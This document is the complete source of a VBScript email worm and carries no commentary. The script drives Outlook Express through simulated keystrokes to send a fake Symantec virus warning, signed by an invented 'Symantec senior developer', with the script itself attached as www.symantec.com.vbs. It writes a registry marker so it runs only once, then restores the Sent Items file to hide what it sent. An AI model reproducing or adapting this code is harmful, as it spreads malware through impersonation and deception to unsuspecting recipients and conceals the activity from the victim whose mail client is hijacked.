On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
OEDone = WshShell.RegRead("HKLM\SOFTWARE\Microsoft\WAB\OE Done")
If Not OEDone = "Symantec" Then
DI = WshShell.RegRead("HKCU\Identities\Default User ID")
AppData = WshShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\AppData")
O = AppData&"\Identities\"&DI&"\Microsoft\Outlook Express\Sent Items.dbx"
N = "C:\WINDOWS\TEMP\SENT.DLL"
FSO.CopyFile O,N
WshShell.Run "C:\PROGRA~1\OUTLOO~1\MSIMN.EXE"
WshShell.AppActivate "Outlook Express"
W 2000
K "%TB"
W 100
K "%EA"
W 100
K "%TIM"
W 100
K "{TAB}{TAB}"
W 100
K "FW: Symantec Anti-Virus Warning"
W 100
K "{TAB}"
W 100
K "{ENTER}----- Original Message -----"
W 100
K "{ENTER}From: <warning@symantec.com> "
W 100
K "{ENTER}To: <supervisor@av.net>; <security@softtools.com>; <mark_fyston@storess.net>; <directorcut@ufp.com>; "
W 100
K "<pjeterov@goldenhit.org>; <kim_di_yung@freeland.ch>; <james.heart@macrosoft.com> "
W 100
K "{ENTER}Subject: FW: Symantec Anti-Virus Warning"
W 100
K "{ENTER}"
W 100
K "{ENTER}"
W 100
K "Hello,"
W 100
K "{ENTER}"
W 100
K "{ENTER}"
W 100
K "{ENTER}There is a new worm on the Net."
W 100
K "{ENTER}This worm is very fast-spreading and very dangerous!"
W 100
K "{ENTER}"
W 100
K "{ENTER}Symantec has first noticed it on April 04, 2001."
W 100
K "{ENTER}"
W 100
K "{ENTER}The attached file is a description of the worm and how it replicates itself. "
W 100
K "{ENTER}"
W 100
K "{ENTER}"
W 100
K "{ENTER}With regards,"
W 100
K "{ENTER}F. Jones"
W 100
K "{ENTER}Symantec senior developer"
W 100
K "%IA"
W 100
K "C:\{ENTER}"
W 100
K "c:\www.symantec.com.vbs{ENTER}"
W 100
K "%FE"
W 100
K "%FX"
W 100
WshShell.AppActivate "Outlook Express"
K "%FX"
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\WAB\OE Done","Hardhead_SatanikChild"
FSO.CopyFile N,O
FSO.DeleteFile N
End If
Sub K(str)
WshShell.SendKeys str
End Sub
Sub W(int)
WScript.Sleep int
End Sub
